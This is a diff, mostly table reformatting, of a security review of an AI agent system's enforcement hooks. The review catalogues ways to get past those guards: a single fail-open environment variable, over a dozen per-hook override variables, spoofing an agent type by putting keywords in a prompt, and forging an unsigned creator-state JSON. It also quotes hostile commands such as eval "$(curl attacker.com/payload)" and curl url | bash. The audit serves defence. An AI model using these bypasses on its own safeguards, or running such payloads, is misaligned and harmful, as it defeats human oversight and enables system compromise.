@@ -21,14 +21,14 @@ The hooks system is the backbone of the agent-studio enforcement architecture, c
 
 ## Scoring Breakdown
 
-| Category | Weight | Score | Weighted |
-|----------|--------|-------|----------|
-| Bypass Resistance | 30% | 35/100 | 10.5 |
-| Hook Integrity | 20% | 55/100 | 11.0 |
-| Enforcement Completeness | 20% | 75/100 | 15.0 |
-| Input Validation | 15% | 50/100 | 7.5 |
-| Information Leakage | 15% | 55/100 | 8.25 |
-| **Total** | **100%** | | **52.25** |
+| Category                 | Weight   | Score  | Weighted  |
+| ------------------------ | -------- | ------ | --------- |
+| Bypass Resistance        | 30%      | 35/100 | 10.5      |
+| Hook Integrity           | 20%      | 55/100 | 11.0      |
+| Enforcement Completeness | 20%      | 75/100 | 15.0      |
+| Input Validation         | 15%      | 50/100 | 7.5       |
+| Information Leakage      | 15%      | 55/100 | 8.25      |
+| **Total**                | **100%** |        | **52.25** |
 
 ---
 
@@ -36,60 +36,60 @@ The hooks system is the backbone of the agent-studio enforcement architecture, c
 
 ### S -- Spoofing
 
-| Threat | Impact | Likelihood | Current Mitigation | Gap |
-|--------|--------|------------|-------------------|-----|
-| Agent type spoofing via prompt string manipulation | HIGH | HIGH | String matching on "you are PLANNER" etc. | Trivially bypassed by including keywords in prompt |
-| Creator state file manipulation | MEDIUM | MEDIUM | TTL + JSON state file | No HMAC/integrity protection on state file |
-| Router state tampering | HIGH | MEDIUM | File-based state at router-state.json | No integrity verification, writable by any process |
+| Threat                                             | Impact | Likelihood | Current Mitigation                        | Gap                                                |
+| -------------------------------------------------- | ------ | ---------- | ----------------------------------------- | -------------------------------------------------- |
+| Agent type spoofing via prompt string manipulation | HIGH   | HIGH       | String matching on "you are PLANNER" etc. | Trivially bypassed by including keywords in prompt |
+| Creator state file manipulation                    | MEDIUM | MEDIUM     | TTL + JSON state file                     | No HMAC/integrity protection on state file         |
+| Router state tampering                             | HIGH   | MEDIUM     | File-based state at router-state.json     | No integrity verification, writable by any process |
 
 **Key Risk:** Agent type detection in `pre-task-unified.cjs` (lines 153-180) and `routing-guard.cjs` uses `prompt.toLowerCase().includes(pattern)` which means any spawned agent can claim to be a PLANNER or SECURITY-ARCHITECT by including the detection keywords anywhere in the prompt.
 
 ### T -- Tampering
 
-| Threat | Impact | Likelihood | Current Mitigation | Gap |
-|--------|--------|------------|-------------------|-----|
-| Environment variable override to disable all hooks | CRITICAL | MEDIUM | Audit logging via auditSecurityOverride() | No protection against env var injection |
-| State file modification (router-state.json, active-creators.json, loop-state.json) | HIGH | MEDIUM | File-based with atomic writes | No checksum/HMAC, writable by any hook process |
-| Registry.cjs SAFE_COMMANDS_ALLOWLIST includes eval/exec | CRITICAL | HIGH | Allowlist check before command execution | eval and exec are inherently dangerous |
+| Threat                                                                             | Impact   | Likelihood | Current Mitigation                        | Gap                                            |
+| ---------------------------------------------------------------------------------- | -------- | ---------- | ----------------------------------------- | ---------------------------------------------- |
+| Environment variable override to disable all hooks                                 | CRITICAL | MEDIUM     | Audit logging via auditSecurityOverride() | No protection against env var injection        |
+| State file modification (router-state.json, active-creators.json, loop-state.json) | HIGH     | MEDIUM     | File-based with atomic writes             | No checksum/HMAC, writable by any hook process |
+| Registry.cjs SAFE_COMMANDS_ALLOWLIST includes eval/exec                            | CRITICAL | HIGH       | Allowlist check before command execution  | eval and exec are inherently dangerous         |
 
 **Key Risk:** Setting `HOOK_FAIL_OPEN=true` disables fail-closed behavior in routing-guard.cjs, pre-task-unified.cjs, unified-creator-guard.cjs, and unified-pre-write-hook.cjs simultaneously. This is a single point of failure for the entire enforcement layer.
 
 ### R -- Repudiation
 
-| Threat | Impact | Likelihood | Current Mitigation | Gap |
-|--------|--------|------------|-------------------|-----|
-| Security override without audit trail | HIGH | MEDIUM | auditSecurityOverride() to stderr | Stderr can be redirected/lost; no persistent log |
-| Hook bypass without detection | HIGH | MEDIUM | Individual audit logging per hook | No centralized security event dashboard |
+| Threat                                | Impact | Likelihood | Current Mitigation                | Gap                                              |
+| ------------------------------------- | ------ | ---------- | --------------------------------- | ------------------------------------------------ |
+| Security override without audit trail | HIGH   | MEDIUM     | auditSecurityOverride() to stderr | Stderr can be redirected/lost; no persistent log |
+| Hook bypass without detection         | HIGH   | MEDIUM     | Individual audit logging per hook | No centralized security event dashboard          |
 
 **Key Risk:** While `auditSecurityOverride()` in hook-input.cjs provides consistent override logging, it writes to stderr which is ephemeral. No persistent, tamper-evident audit log exists for security-critical events.
 
 ### I -- Information Disclosure
 
-| Threat | Impact | Likelihood | Current Mitigation | Gap |
-|--------|--------|------------|-------------------|-----|
-| Debug logging exposing internal state | MEDIUM | LOW | DEBUG_HOOKS gated output | ROUTER_DEBUG defaults to enabled (not 'false') |
-| Error messages exposing hook internals | LOW | LOW | Generic error messages | Stack traces suppressed (HOOK-010 fix) |
-| Routing analysis output leaking intent classification | LOW | LOW | Advisory output only | user-prompt-unified outputs agent scores to stdout |
+| Threat                                                | Impact | Likelihood | Current Mitigation       | Gap                                                |
+| ----------------------------------------------------- | ------ | ---------- | ------------------------ | -------------------------------------------------- |
+| Debug logging exposing internal state                 | MEDIUM | LOW        | DEBUG_HOOKS gated output | ROUTER_DEBUG defaults to enabled (not 'false')     |
+| Error messages exposing hook internals                | LOW    | LOW        | Generic error messages   | Stack traces suppressed (HOOK-010 fix)             |
+| Routing analysis output leaking intent classification | LOW    | LOW        | Advisory output only     | user-prompt-unified outputs agent scores to stdout |
 
 **Current posture is acceptable** for information disclosure. Debug outputs are gated and stack traces are suppressed (HOOK-010 remediation).
 
 ### D -- Denial of Service
 
-| Threat | Impact | Likelihood | Current Mitigation | Gap |
-|--------|--------|------------|-------------------|-----|
-| Loop/infinite spawn exhaustion | HIGH | MEDIUM | Loop prevention in pre-task-unified.cjs | Budget/depth limits configurable via env vars |
-| Hook chain performance degradation | MEDIUM | LOW | Consolidated hooks (5-to-1 consolidation) | Some hooks still run synchronous spawnSync |
-| State file contention | LOW | LOW | Atomic writes, lock files | Lock timeout is 10s, sufficient |
+| Threat                             | Impact | Likelihood | Current Mitigation                        | Gap                                           |
+| ---------------------------------- | ------ | ---------- | ----------------------------------------- | --------------------------------------------- |
+| Loop/infinite spawn exhaustion     | HIGH   | MEDIUM     | Loop prevention in pre-task-unified.cjs   | Budget/depth limits configurable via env vars |
+| Hook chain performance degradation | MEDIUM | LOW        | Consolidated hooks (5-to-1 consolidation) | Some hooks still run synchronous spawnSync    |
+| State file contention              | LOW    | LOW        | Atomic writes, lock files                 | Lock timeout is 10s, sufficient               |
 
 **Loop prevention** is well-designed with spawn depth limits (default 5), pattern detection (threshold 3), evolution budget (3), and cooldown periods (5 minutes). However, all limits are overridable via environment variables.
 
 ### E -- Elevation of Privilege
 
-| Threat | Impact | Likelihood | Current Mitigation | Gap |
-|--------|--------|------------|-------------------|-----|
-| Router using blacklisted tools | HIGH | LOW | routing-guard.cjs bash/write/tool checks | ROUTER_BASH_GUARD=off, ROUTER_WRITE_GUARD=off overrides |
-| Subagent bypassing tool-scope-validator | HIGH | MEDIUM | tool-scope-validator.cjs | Defaults to WARN, fails OPEN on error |
-| Creator guard bypass via active-creators.json | MEDIUM | MEDIUM | TTL-based creator state | State file manipulation skips creator workflow |
+| Threat                                        | Impact | Likelihood | Current Mitigation                       | Gap                                                     |
+| --------------------------------------------- | ------ | ---------- | ---------------------------------------- | ------------------------------------------------------- |
+| Router using blacklisted tools                | HIGH   | LOW        | routing-guard.cjs bash/write/tool checks | ROUTER_BASH_GUARD=off, ROUTER_WRITE_GUARD=off overrides |
+| Subagent bypassing tool-scope-validator       | HIGH   | MEDIUM     | tool-scope-validator.cjs                 | Defaults to WARN, fails OPEN on error                   |
+| Creator guard bypass via active-creators.json | MEDIUM | MEDIUM     | TTL-based creator state                  | State file manipulation skips creator workflow          |
 
 ---
 
@@ -102,6 +102,7 @@ The hooks system is the backbone of the agent-studio enforcement architecture, c
 **File:** Multiple (`routing-guard.cjs:1041-1043`, `pre-task-unified.cjs:724-727`, `unified-creator-guard.cjs:468-471`, `unified-pre-write-hook.cjs:~509`)
 
 **Description:** Setting the single environment variable `HOOK_FAIL_OPEN=true` converts ALL fail-closed hooks to fail-open, simultaneously disabling:
+
 - Routing guard (planner-first, security review, router self-check)
 - Pre-task unified (TaskList-first, loop prevention, routing checks)
 - Creator guard (artifact creation workflow enforcement)
@@ -110,6 +111,7 @@ The hooks system is the backbone of the agent-studio enforcement architecture, c
 **Impact:** Complete bypass of the enforcement layer with a single environment variable. An adversarial prompt that can influence environment configuration, or any process running in the same shell, can disable all security hooks.
 
 **Evidence:**
+
 ```javascript
 // routing-guard.cjs lines 1041-1043
 if (process.env.HOOK_FAIL_OPEN === 'true') {
@@ -121,6 +123,7 @@ if (process.env.HOOK_FAIL_OPEN === 'true') {
 **CVSS Estimate:** 8.1 (High)
 
 **Recommendation:**
+
 1. Remove `HOOK_FAIL_OPEN` as a global override. Each hook should have its own specific debug override.
 2. If retained, require a multi-factor override (e.g., `HOOK_FAIL_OPEN` + a per-session nonce written to a file).
 3. Add persistent audit logging (not just stderr) when any fail-open override is used.
@@ -132,6 +135,7 @@ if (process.env.HOOK_FAIL_OPEN === 'true') {
 **File:** `.claude/hooks/safety/validators/registry.cjs:144-145`
 
 **Description:** The bash command validator's allowlist includes `eval` and `exec` as "safe" shell builtins. These are two of the most dangerous shell commands:
+
 - `eval` executes arbitrary strings as shell commands, enabling code injection
 - `exec` replaces the current process, can be used for process hijacking
 
@@ -140,6 +144,7 @@ Any command starting with `eval` or `exec` will pass the allowlist check without
 **Impact:** A crafted bash command like `eval "$(curl attacker.com/payload)"` would pass the allowlist because `eval` is considered "safe."
 
 **Evidence:**
+
 ```javascript
 // registry.cjs lines 144-145
 'eval', // evaluate expression
@@ -149,6 +154,7 @@ Any command starting with `eval` or `exec` will pass the allowlist check without
 **CVSS Estimate:** 9.0 (Critical)
 
 **Recommendation:**
+
 1. Remove `eval` and `exec` from SAFE_COMMANDS_ALLOWLIST immediately.
 2. Add them to a DANGEROUS_COMMANDS list that requires special validation.
 3. Block `eval` commands entirely unless wrapped in a specific validator.
@@ -162,27 +168,28 @@ Any command starting with `eval` or `exec` will pass the allowlist check without
 
 **Description:** The following environment variables each independently disable a specific security control:
 
-| Variable | Hook | Effect |
-|----------|------|--------|
-| `HOOK_FAIL_OPEN=true` | All fail-closed hooks | Master kill switch |
-| `ROUTER_SELF_CHECK=off` | routing-guard.cjs | Router can use blacklisted tools |
-| `PLANNER_FIRST_ENFORCEMENT=off` | routing-guard.cjs / pre-task-unified.cjs | Skip planner-first requirement |
-| `SECURITY_REVIEW_ENFORCEMENT=off` | routing-guard.cjs / pre-task-unified.cjs | Skip security review requirement |
-| `ROUTER_WRITE_GUARD=off` | routing-guard.cjs | Router can write files directly |
-| `ROUTER_BASH_GUARD=off` | routing-guard.cjs | Router can run arbitrary bash |
-| `CREATOR_GUARD=off` | unified-creator-guard.cjs | Direct artifact writes allowed |
-| `SHELL_INJECTION_VALIDATOR=off` | shell-injection-validator.cjs | No shell injection checking |
-| `LOOP_PREVENTION_MODE=off` | pre-task-unified.cjs | No loop prevention |
-| `ALLOW_UNREGISTERED_COMMANDS=true` | validators/registry.cjs | Bypass command validation |
-| `BASH_VALIDATOR_FAIL_OPEN=true` | bash-command-validator.cjs | Bash validator fails open |
-| `TASK_COMPLETION_GUARD=off` | post-task-unified.cjs | No completion tracking |
-| `TASKLIST_FIRST_ENFORCEMENT=off` | pre-task-unified.cjs | TaskList-first not enforced |
+| Variable                           | Hook                                     | Effect                           |
+| ---------------------------------- | ---------------------------------------- | -------------------------------- |
+| `HOOK_FAIL_OPEN=true`              | All fail-closed hooks                    | Master kill switch               |
+| `ROUTER_SELF_CHECK=off`            | routing-guard.cjs                        | Router can use blacklisted tools |
+| `PLANNER_FIRST_ENFORCEMENT=off`    | routing-guard.cjs / pre-task-unified.cjs | Skip planner-first requirement   |
+| `SECURITY_REVIEW_ENFORCEMENT=off`  | routing-guard.cjs / pre-task-unified.cjs | Skip security review requirement |
+| `ROUTER_WRITE_GUARD=off`           | routing-guard.cjs                        | Router can write files directly  |
+| `ROUTER_BASH_GUARD=off`            | routing-guard.cjs                        | Router can run arbitrary bash    |
+| `CREATOR_GUARD=off`                | unified-creator-guard.cjs                | Direct artifact writes allowed   |
+| `SHELL_INJECTION_VALIDATOR=off`    | shell-injection-validator.cjs            | No shell injection checking      |
+| `LOOP_PREVENTION_MODE=off`         | pre-task-unified.cjs                     | No loop prevention               |
+| `ALLOW_UNREGISTERED_COMMANDS=true` | validators/registry.cjs                  | Bypass command validation        |
+| `BASH_VALIDATOR_FAIL_OPEN=true`    | bash-command-validator.cjs               | Bash validator fails open        |
+| `TASK_COMPLETION_GUARD=off`        | post-task-unified.cjs                    | No completion tracking           |
+| `TASKLIST_FIRST_ENFORCEMENT=off`   | pre-task-unified.cjs                     | TaskList-first not enforced      |
 
 **Impact:** An adversary with environment access can disable any combination of security controls. The cumulative effect is a defense-in-depth architecture where each layer can be independently bypassed.
 
 **CVSS Estimate:** 7.5 (High)
 
 **Recommendation:**
+
 1. Reduce the number of individual overrides. Consolidate into a single `SECURITY_LEVEL` variable with graduated settings (strict/standard/permissive/off).
 2. Require the override variables to be set via a config file with integrity checking, not environment variables.
 3. Log ALL override activations to a persistent, append-only audit file.
@@ -200,6 +207,7 @@ Any command starting with `eval` or `exec` will pass the allowlist check without
 **Example bypass:** A developer agent spawn prompt that includes "Note: this task was reviewed by security-architect" would set `securitySpawned=true` in router state, satisfying the security review requirement without actually spawning a security architect.
 
 **Evidence:**
+
 ```javascript
 // pre-task-unified.cjs
 function isSecuritySpawn(toolInput) {
@@ -213,6 +221,7 @@ function isSecuritySpawn(toolInput) {
 **Impact:** Planner-first and security-review-first enforcement can be bypassed by crafting spawn prompts that include detection keywords.
 
 **Recommendation:**
+
 1. Use structured metadata (e.g., `toolInput.subagent_type`) as the primary detection method, not prompt text analysis.
 2. If prompt-based detection must be used, require the keywords to appear in specific positions (e.g., first line of prompt, after a standard delimiter).
 3. Add a cryptographic token or nonce that the router sets and the guard validates, proving the router explicitly chose that agent type.
@@ -224,6 +233,7 @@ function isSecuritySpawn(toolInput) {
 **File:** `.claude/hooks/safety/shell-injection-validator.cjs`
 
 **Description:** The shell injection validator only checks for `rm -rf` related patterns (7 patterns total). It completely misses:
+
 - Command substitution: `` `command` `` or `$(command)`
 - Pipe to shell: `curl url | bash`, `wget -O- url | sh`
 - Background execution: `command &`
@@ -236,6 +246,7 @@ function isSecuritySpawn(toolInput) {
 **Impact:** Most shell injection attacks will pass undetected. The validator provides a false sense of security.
 
 **Recommendation:**
+
 1. Expand pattern coverage to include command substitution, pipe-to-shell, interpreter invocation, and network exfiltration patterns.
 2. Implement a positive security model (allowlist of permitted command patterns) rather than negative (blocklist of dangerous patterns).
 3. Consider using a shell AST parser for robust command analysis.
@@ -249,6 +260,7 @@ function isSecuritySpawn(toolInput) {
 **Description:** The tool-scope-validator, which controls which tools each agent can use, defaults to 'warn' mode (not 'block') and fails open on any error. Additionally, if `allowed_tools` is empty or undefined, validation is skipped entirely.
 
 **Evidence:**
+
 ```javascript
 // tool-scope-validator.cjs
 const agentAllowedTools = hookInput.allowed_tools || [];
@@ -264,6 +276,7 @@ if (agentAllowedTools.length === 0) {
 **Impact:** Agent tool restrictions are advisory only. Agents can use any tool unless explicitly restricted, and even then only get a warning.
 
 **Recommendation:**
+
 1. Change default mode to 'block'.
 2. Change error handling to fail-closed (exit 2).
 3. Require agents to explicitly declare their allowed tools; deny by default when the list is empty.
@@ -277,6 +290,7 @@ if (agentAllowedTools.length === 0) {
 **Description:** The `active-creators.json` state file that tracks which creator workflows are active uses plain JSON with no HMAC, checksum, or signature verification. Any process can write to this file to mark a creator as "active," thereby bypassing the creator guard.
 
 **Evidence:**
+
 ```javascript
 // unified-creator-guard.cjs line 180
 const state = JSON.parse(fs.readFileSync(statePath, 'utf8'));
@@ -286,6 +300,7 @@ const state = JSON.parse(fs.readFileSync(statePath, 'utf8'));
 **Impact:** An attacker or misconfigured hook can write `{"skill-creator": {"active": true, "invokedAt": "2026-02-07T...", "ttl": 600000}}` to bypass the creator guard for any artifact type.
 
 **Recommendation:**
+
 1. Add HMAC signing to the state file using a per-session secret.
 2. Validate HMAC before trusting the state file contents.
 3. Add the creator guard state to the anomaly detector for tamper detection.
@@ -297,6 +312,7 @@ const state = JSON.parse(fs.readFileSync(statePath, 'utf8'));
 **File:** `unified-pre-write-hook.cjs` (Check 8) AND `unified-creator-guard.cjs` (standalone)
 
 **Description:** Creator guard logic is implemented both as Check 8 inside `unified-pre-write-hook.cjs` AND as a standalone `unified-creator-guard.cjs` hook. Both are registered in settings.json. This creates:
+
 1. Double enforcement (wasted compute)
 2. Potential inconsistency if one is updated without the other
 3. Confusion about which is the canonical guard
@@ -304,6 +320,7 @@ const state = JSON.parse(fs.readFileSync(statePath, 'utf8'));
 **Impact:** If one implementation is bypassed or has a bug, the other may still catch it (defense in depth), but the inconsistency risk outweighs the benefit.
 
 **Recommendation:**
+
 1. Designate one as canonical and remove the duplicate.
 2. If both are intentional for defense-in-depth, document this explicitly and ensure identical logic.
 
@@ -332,6 +349,7 @@ const state = JSON.parse(fs.readFileSync(statePath, 'utf8'));
 **Impact:** Prompt injection via reflection queue could cause unintended agent behavior.
 
 **Recommendation:**
+
 1. Sanitize queue entry content before incorporating into spawn prompts.
 2. Validate queue entries against a schema before processing.
 3. Limit the maximum size of queue entry content.
@@ -357,6 +375,7 @@ const state = JSON.parse(fs.readFileSync(statePath, 'utf8'));
 **Description:** The config model validator fails open on any error, allowing model mismatches to go unchecked.
 
 **Evidence:**
+
 ```javascript
 } catch (err) {
   auditLog('config-model-validator', 'error', { error: err.message });
@@ -391,6 +410,7 @@ const state = JSON.parse(fs.readFileSync(statePath, 'utf8'));
 **Impact:** Performance degradation and environment variable inheritance to child processes.
 
 **Recommendation:**
+
 1. Strip security-override environment variables before spawning child processes.
 2. Consider making these async/deferred rather than synchronous.
 
@@ -426,16 +446,16 @@ const state = JSON.parse(fs.readFileSync(statePath, 'utf8'));
 
 ### Lifecycle Coverage
 
-| Event | Hooks | Coverage |
-|-------|-------|----------|
-| UserPromptSubmit | 3 (user-prompt-unified, state-reset, execution-limit-monitor) | GOOD -- Resets state, analyzes prompt, detects triggers |
-| PreToolUse(Task) | 5 (pre-task-unified, config-model-validator, intent-agent-match, spawn-prompt-assembler, spawn-prompt-validator) | GOOD -- Comprehensive spawn validation |
-| PreToolUse(Bash) | 4 (bash-command-validator, shell-injection-validator, routing-guard, execution-limit-monitor) | MODERATE -- Command validation has gaps (SEC-HOOK-002, SEC-HOOK-005) |
-| PreToolUse(Edit/Write) | 5 (unified-pre-write-hook, unified-creator-guard, routing-guard, windows-null-sanitizer, execution-limit-monitor) | GOOD -- Multiple overlapping write guards |
-| PostToolUse(Task) | 2 (post-task-unified, execution-limit-monitor) | GOOD -- Learning extraction, completion tracking |
-| PostToolUse(Edit/Write) | 2 (sync-memory-index, code-index-updater) | GOOD -- Index maintenance |
-| SessionEnd | 2 (session-cleanup, session-end handler) | ADEQUATE -- Cleanup and state persistence |
-| Stop | 1 (execution-limit-monitor) | ADEQUATE |
+| Event                   | Hooks                                                                                                             | Coverage                                                             |
+| ----------------------- | ----------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------- |
+| UserPromptSubmit        | 3 (user-prompt-unified, state-reset, execution-limit-monitor)                                                     | GOOD -- Resets state, analyzes prompt, detects triggers              |
+| PreToolUse(Task)        | 5 (pre-task-unified, config-model-validator, intent-agent-match, spawn-prompt-assembler, spawn-prompt-validator)  | GOOD -- Comprehensive spawn validation                               |
+| PreToolUse(Bash)        | 4 (bash-command-validator, shell-injection-validator, routing-guard, execution-limit-monitor)                     | MODERATE -- Command validation has gaps (SEC-HOOK-002, SEC-HOOK-005) |
+| PreToolUse(Edit/Write)  | 5 (unified-pre-write-hook, unified-creator-guard, routing-guard, windows-null-sanitizer, execution-limit-monitor) | GOOD -- Multiple overlapping write guards                            |
+| PostToolUse(Task)       | 2 (post-task-unified, execution-limit-monitor)                                                                    | GOOD -- Learning extraction, completion tracking                     |
+| PostToolUse(Edit/Write) | 2 (sync-memory-index, code-index-updater)                                                                         | GOOD -- Index maintenance                                            |
+| SessionEnd              | 2 (session-cleanup, session-end handler)                                                                          | ADEQUATE -- Cleanup and state persistence                            |
+| Stop                    | 1 (execution-limit-monitor)                                                                                       | ADEQUATE                                                             |
 
 ### Gap Analysis
 
@@ -502,32 +522,32 @@ The hooks system demonstrates several security strengths:
 
 ### Priority 1 (Immediate -- Before Next Release)
 
-| ID | Finding | Action |
-|----|---------|--------|
-| SEC-HOOK-002 | eval/exec in allowlist | Remove eval, exec, source, . from SAFE_COMMANDS_ALLOWLIST |
-| SEC-HOOK-001 | HOOK_FAIL_OPEN kill switch | Replace with per-hook specific overrides; require config file |
-| SEC-HOOK-005 | Narrow shell injection coverage | Expand to cover OWASP command injection patterns |
+| ID           | Finding                         | Action                                                        |
+| ------------ | ------------------------------- | ------------------------------------------------------------- |
+| SEC-HOOK-002 | eval/exec in allowlist          | Remove eval, exec, source, . from SAFE_COMMANDS_ALLOWLIST     |
+| SEC-HOOK-001 | HOOK_FAIL_OPEN kill switch      | Replace with per-hook specific overrides; require config file |
+| SEC-HOOK-005 | Narrow shell injection coverage | Expand to cover OWASP command injection patterns              |
 
 ### Priority 2 (Next Sprint)
 
-| ID | Finding | Action |
-|----|---------|--------|
-| SEC-HOOK-004 | Spoofable agent detection | Use structured metadata for agent type detection |
-| SEC-HOOK-006 | tool-scope-validator warn default | Change to block default, fail-closed on error |
-| SEC-HOOK-003 | Environment override sprawl | Consolidate into graduated SECURITY_LEVEL setting |
-| SEC-HOOK-007 | Creator state no integrity | Add HMAC signing to active-creators.json |
+| ID           | Finding                           | Action                                            |
+| ------------ | --------------------------------- | ------------------------------------------------- |
+| SEC-HOOK-004 | Spoofable agent detection         | Use structured metadata for agent type detection  |
+| SEC-HOOK-006 | tool-scope-validator warn default | Change to block default, fail-closed on error     |
+| SEC-HOOK-003 | Environment override sprawl       | Consolidate into graduated SECURITY_LEVEL setting |
+| SEC-HOOK-007 | Creator state no integrity        | Add HMAC signing to active-creators.json          |
 
 ### Priority 3 (Backlog)
 
-| ID | Finding | Action |
-|----|---------|--------|
-| SEC-HOOK-008 | Duplicate creator guard | Designate canonical implementation |
-| SEC-HOOK-009 | Plain JSON.parse in task-status | Replace with safeParseJSON |
-| SEC-HOOK-010 | Reflection queue no sanitization | Add content sanitization |
-| SEC-HOOK-011 | windows-null-sanitizer fail-open | Change to fail-closed |
+| ID           | Finding                          | Action                                    |
+| ------------ | -------------------------------- | ----------------------------------------- |
+| SEC-HOOK-008 | Duplicate creator guard          | Designate canonical implementation        |
+| SEC-HOOK-009 | Plain JSON.parse in task-status  | Replace with safeParseJSON                |
+| SEC-HOOK-010 | Reflection queue no sanitization | Add content sanitization                  |
+| SEC-HOOK-011 | windows-null-sanitizer fail-open | Change to fail-closed                     |
 | SEC-HOOK-012 | config-model-validator fail-open | Change to fail-closed for security agents |
-| SEC-HOOK-013 | Routing analysis to stdout | Move to stderr or gate on DEBUG |
-| SEC-HOOK-014 | spawnSync env inheritance | Strip security overrides from child env |
+| SEC-HOOK-013 | Routing analysis to stdout       | Move to stderr or gate on DEBUG           |
+| SEC-HOOK-014 | spawnSync env inheritance        | Strip security overrides from child env   |
 
 ---
 
@@ -535,18 +555,18 @@ The hooks system demonstrates several security strengths:
 
 ### Active Hooks by Directory (45 total)
 
-| Directory | Count | Purpose |
-|-----------|-------|---------|
-| routing/ | 12 | Routing enforcement, model validation, task tracking |
-| safety/ | 9 | Bash validation, shell injection, write scanning |
-| reflection/ | 5 | Reflection queue processing, step-0 guard |
-| monitoring/ | 5 | Execution limits, anomaly detection |
-| evolution/ | 4 | Evolution state tracking |
-| session/ | 2 | State reset, cleanup |
-| validation/ | 2 | Pre-completion validation |
-| memory/ | 1 | Memory index sync |
-| self-healing/ | 1 | Anomaly detection |
-| root/ | 1 | Unified pre-write hook |
+| Directory     | Count | Purpose                                              |
+| ------------- | ----- | ---------------------------------------------------- |
+| routing/      | 12    | Routing enforcement, model validation, task tracking |
+| safety/       | 9     | Bash validation, shell injection, write scanning     |
+| reflection/   | 5     | Reflection queue processing, step-0 guard            |
+| monitoring/   | 5     | Execution limits, anomaly detection                  |
+| evolution/    | 4     | Evolution state tracking                             |
+| session/      | 2     | State reset, cleanup                                 |
+| validation/   | 2     | Pre-completion validation                            |
+| memory/       | 1     | Memory index sync                                    |
+| self-healing/ | 1     | Anomaly detection                                    |
+| root/         | 1     | Unified pre-write hook                               |
 
 ### Archived Hooks (44 total)
 
@@ -597,4 +617,4 @@ Total: **21 independent environment variable overrides** affecting security post
 
 ---
 
-*End of Security Review -- Pipeline #14: Hooks System Deep Dive*
+_End of Security Review -- Pipeline #14: Hooks System Deep Dive_
